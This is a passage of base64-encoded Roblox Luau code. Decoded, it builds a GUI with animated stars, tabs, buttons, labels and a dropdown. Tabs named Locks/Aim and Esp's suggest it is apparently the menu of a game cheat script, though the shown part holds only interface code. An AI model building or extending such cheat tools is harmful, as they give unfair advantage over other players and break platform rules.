3RhciA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgICAgIHN0YXIuU2l6ZSA9IFVEaW0yLm5ldygwLCAyLCAwLCAyKQogICAgICAgIHN0YXIuUG9zaXRpb24gPSBVRGltMi5uZXcobWF0aC5yYW5kb20oKSwgMCwgMCwgMCkKICAgICAgICBzdGFyLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgICAgIHN0YXIuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAuMwogICAgICAgIHN0YXIuQm9yZGVyU2l6ZVBpeGVsID0gMAogICAgICAgIHN0YXIuWkluZGV4ID0gMQogICAgICAgIHN0YXIuUGFyZW50ID0gc3RhckhvbGRlcgogICAgICAgIGxvY2FsIGZhbGxUaW1lID0gbWF0aC5yYW5kb20oMTAsIDIwKQogICAgICAgIGxvY2FsIHR3ZWVuID0gVHdlZW5TZXJ2aWNlOkNyZWF0ZShzdGFyLCBUd2VlbkluZm8ubmV3KGZhbGxUaW1lLCBFbnVtLkVhc2luZ1N0eWxlLkxpbmVhciksIHsKICAgICAgICAgICAgUG9zaXRpb24gPSBzdGFyLlBvc2l0aW9uICsgVURpbTIubmV3KDAsIDAsIDEsIDApLAogICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgIH0pCiAgICAgICAgdHdlZW46UGxheSgpCiAgICAgICAgdHdlZW4uQ29tcGxldGVkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBzdGFyOkRlc3Ryb3koKQogICAgICAgIGVuZCkKICAgICAgICB3YWl0KDAuMDUpCiAgICBlbmQKZW5kKSgpCgpsb2NhbCB0YWJzRnJhbWUgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKdGFic0ZyYW1lLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMzApCnRhYnNGcmFtZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAwLCAwLCAxMCkKdGFic0ZyYW1lLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCnRhYnNGcmFtZS5OYW1lID0gIlRhYnNGcmFtZSIKdGFic0ZyYW1lLlBhcmVudCA9IGZyYW1lCgpsb2NhbCB0YWJMYXlvdXQgPSBJbnN0YW5jZS5uZXcoIlVJTGlzdExheW91dCIsIHRhYnNGcmFtZSkKdGFiTGF5b3V0LkZpbGxEaXJlY3Rpb24gPSBFbnVtLkZpbGxEaXJlY3Rpb24uSG9yaXpvbnRhbAp0YWJMYXlvdXQuSG9yaXpvbnRhbEFsaWdubWVudCA9IEVudW0uSG9yaXpvbnRhbEFsaWdubWVudC5DZW50ZXIKdGFiTGF5b3V0LlNvcnRPcmRlciA9IEVudW0uU29ydE9yZGVyLkxheW91dE9yZGVyCnRhYkxheW91dC5QYWRkaW5nID0gVURpbS5uZXcoMCwgOCkKCmxvY2FsIGxpc3RDb250YWluZXIgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKbGlzdENvbnRhaW5lci5TaXplID0gVURpbTIubmV3KDEsIC0yMCwgMSwgLTUwKQpsaXN0Q29udGFpbmVyLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDEwLCAwLCA0MCkKbGlzdENvbnRhaW5lci5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQpsaXN0Q29udGFpbmVyLk5hbWUgPSAiTGlzdENvbnRhaW5lciIKbGlzdENvbnRhaW5lci5QYXJlbnQgPSBmcmFtZQoKbG9jYWwgdWlMaXN0ID0gSW5zdGFuY2UubmV3KCJVSUxpc3RMYXlvdXQiLCBsaXN0Q29udGFpbmVyKQp1aUxpc3QuU29ydE9yZGVyID0gRW51bS5Tb3J0T3JkZXIuTGF5b3V0T3JkZXIKdWlMaXN0LlBhZGRpbmcgPSBVRGltLm5ldygwLCA4KQoKbG9jYWwgdGFiUGFnZXMgPSB7fQpsb2NhbCBhY3RpdmVUYWIgPSBuaWwKCmxvY2FsIGZ1bmN0aW9uIHN3aXRjaFRhYih0YWJOYW1lKQogICAgZm9yIG5hbWUsIHBhZ2UgaW4gcGFpcnModGFiUGFnZXMpIGRvCiAgICAgICAgcGFnZS5WaXNpYmxlID0gKG5hbWUgPT0gdGFiTmFtZSkKICAgIGVuZAogICAgYWN0aXZlVGFiID0gdGFiTmFtZQplbmQKLS0tLS0tLS0tLS0tLS0tLS0tLS0tCmxvY2FsIHRhYkljb25zID0gewogICAgWyJIb21lIl0gPSAiaG9tZSIsCiAgICBbIlBsYXllciJdID0gInVzZXIiLAoJWyJWYyJdID0gInZvbHVtZS0yIiwKCVsiR2FtZVRhYiJdID0gInNlbmQtdG8tYmFjayIsCiAgICBbIkxvY2tzL0FpbSJdID0gInBsdXMiLAogICAgWyJFc3AncyJdID0gImV5ZSIsCiAgICBbIk1pc2MiXSA9ICJzZXR0aW5ncyIKfQotLS0tLS0tLS0tLS0tLS0tLS0tLS0KbG9jYWwgZnVuY3Rpb24gY3JlYXRlVGFiKHRhYk5hbWUpCiAgICBsb2NhbCB0YWJCdXR0b24gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQogICAgdGFiQnV0dG9uLlNpemUgPSBVRGltMi5uZXcoMCwgMzAsIDAsIDMwKQogICAgdGFiQnV0dG9uLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwLjkKICAgIHRhYkJ1dHRvbi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMTAsIDEwLCAxMCkKICAgIHRhYkJ1dHRvbi5UZXh0ID0gIiIKICAgIHRhYkJ1dHRvbi5BdXRvQnV0dG9uQ29sb3IgPSBmYWxzZQogICAgdGFiQnV0dG9uLlpJbmRleCA9IDIKICAgIHRhYkJ1dHRvbi5QYXJlbnQgPSB0YWJzRnJhbWUKCiAgICBsb2NhbCBjb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikKICAgIGNvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA1KQogICAgY29ybmVyLlBhcmVudCA9IHRhYkJ1dHRvbgoKICAgIGxvY2FsIGhvdmVyU291bmQgPSBJbnN0YW5jZS5uZXcoIlNvdW5kIikKICAgIGhvdmVyU291bmQuU291bmRJZCA9ICJyYnhhc3NldGlkOi8vOTI4NzYxMDg2NTYzMTkiCiAgICBob3ZlclNvdW5kLlZvbHVtZSA9IDAuMQogICAgaG92ZXJTb3VuZC5OYW1lID0gIkhvdmVyU291bmQiCiAgICBob3ZlclNvdW5kLlBhcmVudCA9IHRhYkJ1dHRvbgoKICAgIGxvY2FsIGNsaWNrU291bmQgPSBJbnN0YW5jZS5uZXcoIlNvdW5kIikKICAgIGNsaWNrU291bmQuU291bmRJZCA9ICJyYnhhc3NldGlkOi8vMTU2NzUwNTkzMjMiCiAgICBjbGlja1NvdW5kLlZvbHVtZSA9IDAuMgogICAgY2xpY2tTb3VuZC5OYW1lID0gIkNsaWNrU291bmQiCiAgICBjbGlja1NvdW5kLlBhcmVudCA9IHRhYkJ1dHRvbgoKICAgIHRhYkJ1dHRvbi5Nb3VzZUVudGVyOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgIFR3ZWVuU2VydmljZTpDcmVhdGUodGFiQnV0dG9uLCBUd2VlbkluZm8ubmV3KDAuMiksIHsKICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwMCwgMjAwLCAyMDApCiAgICAgICAgfSk6UGxheSgpCiAgICAgICAgaG92ZXJTb3VuZDpQbGF5KCkKICAgIGVuZCkKCiAgICB0YWJCdXR0b24uTW91c2VMZWF2ZTpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBUd2VlblNlcnZpY2U6Q3JlYXRlKHRhYkJ1dHRvbiwgVHdlZW5JbmZvLm5ldygwLjIpLCB7CiAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigxMCwgMTAsIDEwKQogICAgICAgIH0pOlBsYXkoKQogICAgZW5kKQoKICAgIGxvY2FsIGljb25OYW1lID0gdGFiSWNvbnNbdGFiTmFtZV0gb3IgImNpcmNsZSIKICAgIGxvY2FsIGljb25EYXRhID0gZ2V0SWNvbihpY29uTmFtZSkKICAgIGlmIGljb25EYXRhIHRoZW4KICAgICAgICBsb2NhbCBpY29uTGFiZWwgPSBJbnN0YW5jZS5uZXcoIkltYWdlTGFiZWwiKQogICAgICAgIGljb25MYWJlbC5TaXplID0gVURpbTIubmV3KDAsIDIwLCAwLCAyMCkKICAgICAgICBpY29uTGFiZWwuUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAwLCAwLjUsIDApCiAgICAgICAgaWNvbkxhYmVsLkFuY2hvclBvaW50ID0gVmVjdG9yMi5uZXcoMC41LCAwLjUpCiAgICAgICAgaWNvbkxhYmVsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgaWNvbkxhYmVsLkltYWdlID0gZ2V0QXNzZXRVcmkoaWNvbkRhdGEuaWQpCiAgICAgICAgaWNvbkxhYmVsLkltYWdlUmVjdFNpemUgPSBpY29uRGF0YS5pbWFnZVJlY3RTaXplCiAgICAgICAgaWNvbkxhYmVsLkltYWdlUmVjdE9mZnNldCA9IGljb25EYXRhLmltYWdlUmVjdE9mZnNldAogICAgICAgIGljb25MYWJlbC5aSW5kZXggPSAzCiAgICAgICAgaWNvbkxhYmVsLlBhcmVudCA9IHRhYkJ1dHRvbgogICAgZWxzZQogICAgICAgIHdhcm4oIkZhaWxlZCB0byBjcmVhdGUgaWNvbiBmb3IgdGFiOiAiIC4uIHRhYk5hbWUgLi4gIiAoSWNvbjogIiAuLiBpY29uTmFtZSAuLiAiKSIpCiAgICBlbmQKCiAgICBsb2NhbCBwYWdlID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCiAgICBwYWdlLk5hbWUgPSB0YWJOYW1lCiAgICBwYWdlLlZpc2libGUgPSBmYWxzZQogICAgcGFnZS5TaXplID0gVURpbTIubmV3KDEsIC0yMCwgMSwgLTMwKQogICAgcGFnZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAxMCwgMCwgMTApCiAgICBwYWdlLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICBwYWdlLlpJbmRleCA9IDEKICAgIHBhZ2UuUGFyZW50ID0gbGlzdENvbnRhaW5lcgoKICAgIGxvY2FsIGxheW91dCA9IEluc3RhbmNlLm5ldygiVUlMaXN0TGF5b3V0IikKICAgIGxheW91dC5Tb3J0T3JkZXIgPSBFbnVtLlNvcnRPcmRlci5MYXlvdXRPcmRlcgogICAgbGF5b3V0LlBhZGRpbmcgPSBVRGltLm5ldygwLCA4KQogICAgbGF5b3V0LlBhcmVudCA9IHBhZ2UKCiAgICB0YWJQYWdlc1t0YWJOYW1lXSA9IHBhZ2UKCiAgICB0YWJCdXR0b24uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgY2xpY2tTb3VuZDpQbGF5KCkKICAgICAgICBzd2l0Y2hUYWIodGFiTmFtZSkKICAgIGVuZCkKCiAgICBpZiBub3QgYWN0aXZlVGFiIHRoZW4KICAgICAgICBzd2l0Y2hUYWIodGFiTmFtZSkKICAgIGVuZAoKICAgIHJldHVybiBwYWdlCmVuZAoKbG9jYWwgVGFiID0ge30KZnVuY3Rpb24gVGFiOk5ldyh0YWJOYW1lKQogICAgaWYgbm90IHRhYlBhZ2VzW3RhYk5hbWVdIHRoZW4KICAgICAgICBjcmVhdGVUYWIodGFiTmFtZSkKICAgIGVuZAogICAgcmV0dXJuIHsKICAgICAgICAgICAgICAgIENyZWF0ZUJ1dHRvbiA9IGZ1bmN0aW9uKF8sIG9wdGlvbnMpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgY3VycmVudFBhZ2UgPSB0YWJQYWdlc1t0YWJOYW1lXQogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBjdXJyZW50UGFnZSB0aGVuIHJldHVybiBlbmQKCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgYnV0dG9uID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgICAgICAgICAgICAgICAgICBidXR0b24uU2l6ZSA9IFVEaW0yLm5ldygxLjAzLCAwLCAwLCA0MCkKICAgICAgICAgICAgICAgICAgICBidXR0b24uQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAuOQogICAgICAgICAgICAgICAgICAgIGJ1dHRvbi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCkKICAgICAgICAgICAgICAgICAgICBidXR0b24uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICAgICAgYnV0dG9uLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtCiAgICAgICAgICAgICAgICAgICAgYnV0dG9uLlRleHRTaXplID0gMTgKICAgICAgICAgICAgICAgICAgICBidXR0b24uVGV4dCA9IG9wdGlvbnMuTmFtZSBvciAiTmV3IEJ1dHRvbiIKICAgICAgICAgICAgICAgICAgICBidXR0b24uVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LkNlbnRlcgogICAgICAgICAgICAgICAgICAgIGJ1dHRvbi5BdXRvQnV0dG9uQ29sb3IgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgIGJ1dHRvbi5aSW5kZXggPSAyCgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGNvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBidXR0b24pCiAgICAgICAgICAgICAgICAgICAgY29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDYpCgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGhvdmVyU291bmQgPSBJbnN0YW5jZS5uZXcoIlNvdW5kIiwgYnV0dG9uKQogICAgICAgICAgICAgICAgICAgIGhvdmVyU291bmQuU291bmRJZCA9ICJyYnhhc3NldGlkOi8vOTI4NzYxMDg2NTYzMTkiCiAgICAgICAgICAgICAgICAgICAgaG92ZXJTb3VuZC5Wb2x1bWUgPSAwLjEKCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgY2xpY2tTb3VuZCA9IEluc3RhbmNlLm5ldygiU291bmQiLCBidXR0b24pCiAgICAgICAgICAgICAgICAgICAgY2xpY2tTb3VuZC5Tb3VuZElkID0gInJieGFzc2V0aWQ6Ly8xNTY3NTA1OTMyMyIKICAgICAgICAgICAgICAgICAgICBjbGlja1NvdW5kLlZvbHVtZSA9IDAuMwoKICAgICAgICAgICAgICAgICAgICBidXR0b24uTW91c2VFbnRlcjpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZShidXR0b24sIFR3ZWVuSW5mby5uZXcoMC4yKSwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICAgICAgICAgIH0pOlBsYXkoKQogICAgICAgICAgICAgICAgICAgICAgICBob3ZlclNvdW5kOlBsYXkoKQogICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICBidXR0b24uTW91c2VMZWF2ZTpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZShidXR0b24sIFR3ZWVuSW5mby5uZXcoMC4yKSwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApCiAgICAgICAgICAgICAgICAgICAgICAgIH0pOlBsYXkoKQogICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICBidXR0b24uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIGNsaWNrU291bmQ6UGxheSgpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHR5cGVvZihvcHRpb25zLkNhbGxiYWNrKSA9PSAiZnVuY3Rpb24iIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9wdGlvbnMuQ2FsbGJhY2soKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgYnV0dG9uLlBhcmVudCA9IGN1cnJlbnRQYWdlCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGJ1dHRvbgogICAgICAgICAgICAgICAgZW5kLAoKICAgICAgICAgICAgICAgIENyZWF0ZUxhYmVsID0gZnVuY3Rpb24oXywgb3B0aW9ucykKICAgICAgICAgICAgICAgICAgICBsb2NhbCBjdXJyZW50UGFnZSA9IHRhYlBhZ2VzW3RhYk5hbWVdCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IGN1cnJlbnRQYWdlIHRoZW4gcmV0dXJuIGVuZAoKCQkJCWxvY2FsIGxhYmVsID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQoJCQkJbGFiZWwuU2l6ZSA9IFVEaW0yLm5ldygxLjAzLCAwLCAwLCA0MCkKCQkJCWxhYmVsLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDAsIDAsIDApCgkJCQlsYWJlbC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQoJCQkJbGFiZWwuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApCgkJCQlsYWJlbC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKCQkJCWxhYmVsLkZvbnQgPSBFbnVtLkZvbnQuTnVuaXRvCgkJCQlsYWJlbC5UZXh0U2l6ZSA9IDIwCgkJCQlsYWJlbC5UZXh0VHJhbnNwYXJlbmN5ID0gMC40CgkJCQlsYWJlbC5UZXh0ID0gb3B0aW9ucy5OYW1lIG9yICJOZXcgTGFiZWwiCgkJCQlsYWJlbC5UZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdAoJCQkJbGFiZWwuWkluZGV4ID0gMgoKCQkJCWxvY2FsIGNvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBsYWJlbCkKCQkJCWNvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA2KQoKCQkJCWxhYmVsLlBhcmVudCA9IGN1cnJlbnRQYWdlCgkJCQlyZXR1cm4gbGFiZWwKCQkJZW5kLAoKQ3JlYXRlRHJvcGRvd24gPSBmdW5jdGlvbihfLCBEcm9wZG93blNldHRpbmdzKQogICAgbG9jYWwgY3VycmVudFBhZ2UgPSB0YWJQYWdlc1t0YWJOYW1lXQogICAgaWYgbm90IGN1cnJlbnRQYWdlIHRoZW4gcmV0dXJuIGVuZAoKICAgIC0tIEFuaW1hdGlvbiBzZXR0aW5ncwogICAgbG9jYWwgQW5pbWF0aW9uU2V0dGluZ3MgPSB7CiAgICAgICAgRmFkZUR1cmF0aW9uID0gMC4zLCAtLSBEdXJhdGlvbiBmb3Igb3B0aW9ucycgZmFkZSBpbi9vdXQKICAgICAgICBGYWRlRGVsYXlJbmNyZW1lbnQgPSAwLjEsIC0tIFVudXNlZCAoa2VwdCBmb3IgY29tcGF0aWJpbGl0eSkKICAgICAgICBFeHBhbmREdXJhdGlvbiA9IDAuMSwgLS0gRHVyYXRpb24gZm9yIGRyb3Bkb3duIGV4cGFuZC9zaHJpbmsKICAgICAgICBUb2dnbGVSb3RhdGlvbkR1cmF0aW9uID0gMC40LCAtLSBEdXJhdGlvbiBmb3IgdG9nZ2xlIGljb24gcm90YXRpb24KICAgICAgICBTZWxlY3Rpb25UcmFuc2l0aW9uRHVyYXRpb24gPSAwLjIgLS0gRHVyYXRpb24gZm9yIG9wdGlvbiBzZWxlY3Rpb24gaGlnaGxpZ2h0CiAgICB9CgogICAgbG9jYWwgVHdlZW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJUd2VlblNlcnZpY2UiKQoKICAgIGxvY2FsIERyb3Bkb3duID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCiAgICBEcm9wZG93bi5OYW1lID0gRHJvcGRvd25TZXR0aW5ncy5OYW1lIG9yICJEcm9wZG93biIKICAgIERyb3Bkb3duLlNpemUgPSBVRGltMi5uZXcoMS4wMywgLTEwLCAwLCA0NSkKICAgIERyb3Bkb3duLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKQogICAgRHJvcGRvd24uQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgIERyb3Bkb3duLkJvcmRlclNpemVQaXhlbCA9IDAKICAgIERyb3Bkb3duLlBhcmVudCA9IGN1cnJlbnRQYWdlCiAgICBsb2NhbCBzdWNjZXNzLCBlcnIgPSBwY2FsbChmdW5jdGlvbigpIERyb3Bkb3duLlpJbmRleCA9IDIgZW5kKQogICAgaWYgbm90IHN1Y2Nlc3MgdGhlbiB3YXJuKCJaSW5kZXggZmFpbGVkIGZvciBEcm9wZG93bjogIiAuLiB0b3N0cmluZyhlcnIpKSBlbmQKCiAgICBsb2NhbCBjb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgRHJvcGRvd24pCiAgICBjb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgNikKCiAgICBsb2NhbCB0aXRsZSA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKICAgIHRpdGxlLlNpemUgPSBVRGltMi5uZXcoMSwgLTUwLCAwLCAyMCkKICAgIHRpdGxlLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDEwLCAwLCAxMCkKICAgIHRpdGxlLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICB0aXRsZS5UZXh0ID0gRHJvcGRvd25TZXR0aW5ncy5OYW1lIG9yICJEcm9wZG93biIKICAgIHRpdGxlLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgdGl0bGUuRm9udCA9IEVudW0uRm9udC5Hb3RoYW0KICAgIHRpdGxlLlRleHRTaXplID0gMTgKICAgIHRpdGxlLlRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0CiAgICB0aXRsZS5QYXJlbnQgPSBEcm9wZG93bgogICAgc3VjY2VzcywgZXJyID0gcGNhbGwoZnVuY3Rpb24oKSB0aXRsZS5aSW5kZXggPSAzIGVuZCkKICAgIGlmIG5vdCBzdWNjZXNzIHRoZW4gd2FybigiWkluZGV4IGZhaWxlZCBmb3IgdGl0bGU6ICIgLi4gdG9zdHJpbmcoZXJyKSkgZW5kCgogICAgbG9jYWwgc2VsZWN0ZWQgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCiAgICBzZWxlY3RlZC5TaXplID0gVURpbTIubmV3KDAsIDEwMCwgMCwgMjApCiAgICBzZWxlY3RlZC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygxLCAtMTMwLCAwLCAxMikKICAgIHNlbGVjdGVkLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICBzZWxlY3RlZC5UZXh0ID0gIk5vbmUiCiAgICBzZWxlY3RlZC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgIHNlbGVjdGVkLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtCiAgICBzZWxlY3RlZC5UZXh0U2l6ZSA9IDE2CiAgICBzZWxlY3RlZC5UZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuUmlnaHQKICAgIHNlbGVjdGVkLlBhcmVudCA9IERyb3Bkb3duCiAgICBzdWNjZXNzLCBlcnIgPSBwY2FsbChmdW5jdGlvbigpIHNlbGVjdGVkLlpJbmRleCA9IDMgZW5kKQogICAgaWYgbm90IHN1Y2Nlc3MgdGhlbiB3YXJuKCJaSW5kZXggZmFpbGVkIGZvciBzZWxlY3RlZDogIiAuLiB0b3N0cmluZyhlcnIpKSBlbmQKCiAgICBsb2NhbCB0b2dnbGUgPSBJbnN0YW5jZS5uZXcoIkltYWdlTGFiZWwiKQogICAgdG9nZ2xlLlNpemUgPSBVRGltMi5uZXcoMCwgMjAsIDAsIDIwKQogICAgdG9nZ2xlLlBvc2l0aW9uID0gVURpbTIubmV3KDEsIC0zMCwgMCwgMTIpCiAgICB0b2dnbGUuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgIHRvZ2dsZS5JbWFnZSA9ICJyYnhhc3NldGlkOi8vNjAzMTA5MDk5MCIKICAgIHRvZ2dsZS5JbWFnZUNvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICB0b2dnbGUuUGFyZW50ID0gRHJvcGRvd24KICAgIHN1Y2Nlc3MsIGVyciA9IHBjYWxsKGZ1bmN0aW9uKCkgdG9nZ2xlLlpJbmRleCA9IDMgZW5kKQogICAgaWYgbm90IHN1Y2Nlc3MgdGhlbiB3YXJuKCJaSW5kZXggZmFpbGVkIGZvciB0b2dnbGU6ICIgLi4gdG9zdHJpbmcoZXJyKSkgZW5kCgogICAgbG9jYWwgbGlzdCA9IEluc3RhbmNlLm5ldygiU2Nyb2xsaW5nRnJhbWUiKQogICAgbGlzdC5OYW1lID0gIkxpc3QiCiAgICBsaXN0LlNpemUgPSBVRGltMi5uZXcoMSwgLTEwLCAwLCAwKQogICAgbGlzdC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCA1LCAwLCA0NSkKICAgIGxpc3QuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgIGxpc3QuQm9yZGVyU2l6ZVBpeGVsID0gMAogICAgbGlzdC5TY3JvbGxCYXJUaGlja25lc3MgPSAyCiAgICBsaXN0LlNjcm9sbEJhckltYWdlQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgIGxpc3QuU2Nyb2xsQmFySW1hZ2VUcmFuc3BhcmVuY3kgPSAwLjcKICAgIGxpc3QuVmlzaWJsZSA9IGZhbHNlCiAgICBsaXN0LlBhcmVudCA9IERyb3Bkb3duCiAgICBzdWNjZXNzLCBlcnIgPSBwY2FsbChmdW5jdGlvbigpIGxpc3QuWkluZGV4ID0gNCBlbmQpCiAgICBpZiBub3Qgc3VjY2VzcyB0aGVuIHdhcm4oIlpJbmRleCBmYWlsZWQgZm9yIGxpc3Q6ICIgLi4gdG9zdHJpbmcoZXJyKSkgZW5kCiAgICBEcm9wZG93blNldHRpbmdzLmxpc3QgPSBsaXN0IC0tIEF0dGFjaCBsaXN0IHRvIERyb3Bkb3duU2V0dGluZ3MKCiAgICBsb2NhbCBsaXN0TGF5b3V0ID0gSW5zdGFuY2UubmV3KCJVSUxpc3RMYXlvdXQiLCBsaXN0KQogICAgbGlzdExheW91dC5Tb3J0T3JkZXIgPSBFbnVtLlNvcnRPcmRlci5MYXlvdXRPcmRlcgogICAgbGlzdExheW91dC5QYWRkaW5nID0gVURpbS5uZXcoMCwgMikKCiAgICBpZiBub3QgRHJvcGRvd25TZXR0aW5ncy5DdXJyZW50T3B0aW9uIHRoZW4KICAgICAgICBEcm9wZG93blNldHRpbmdzLkN1cnJlbnRPcHRpb24gPSB7fQogICAgZWxzZWlmIHR5cGUoRHJvcGRvd25TZXR0aW5ncy5DdXJyZW50T3B0aW9uKSA9PSAic3RyaW5nIiB0aGVuCiAgICAgICAgRHJvcGRvd25TZXR0aW5ncy5DdXJyZW50T3B0aW9uID0ge0Ryb3Bkb3duU2V0dGluZ3MuQ3VycmVudE9wdGlvbn0KICAgIGVuZAogICAgaWYgbm90IERyb3Bkb3duU2V0dGluZ3MuTXVsdGlwbGVPcHRpb25zIGFuZCAjRHJvcGRvd25TZXR0aW5ncy5DdXJyZW50T3B0aW9uID4gMSB0aGVuCiAgICAgICAgRHJvcGRvd25TZXR0aW5ncy5DdXJyZW50T3B0aW9uID0ge0Ryb3Bkb3duU2V0dGluZ3MuQ3VycmVudE9wdGlvblsxXX0KICAgIGVuZAogICAgc2VsZWN0ZWQuVGV4dCA9IERyb3Bkb3duU2V0dGluZ3MuQ3VycmVudE9wdGlvblsxXSBvciAiTm9uZSIKCiAgICBsb2NhbCBob3ZlclNvdW5kID0gSW5zdGFuY2UubmV3KCJTb3VuZCIsIERyb3Bkb3duKQogICAgaG92ZXJTb3VuZC5Tb3VuZElkID0gInJieGFzc2V0aWQ6Ly85Mjg3NjEwODY1NjMxOSIKICAgIGhvdmVyU291bmQuVm9sdW1lID0gMC4xCgogICAgbG9jYWwgY2xpY2tTb3VuZCA9IEluc3RhbmNlLm5ldygiU291bmQiLCBEcm9wZG93bikKICAgIGNsaWNrU291bmQuU291bmRJZCA9ICJyYnhhc3NldGlkOi8vMTU2NzUwNTkzMjMiCiAgICBjbGlja1NvdW5kLlZvbHVtZSA9IDAuMwoKICAgIERyb3Bkb3duLk1vdXNlRW50ZXI6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICA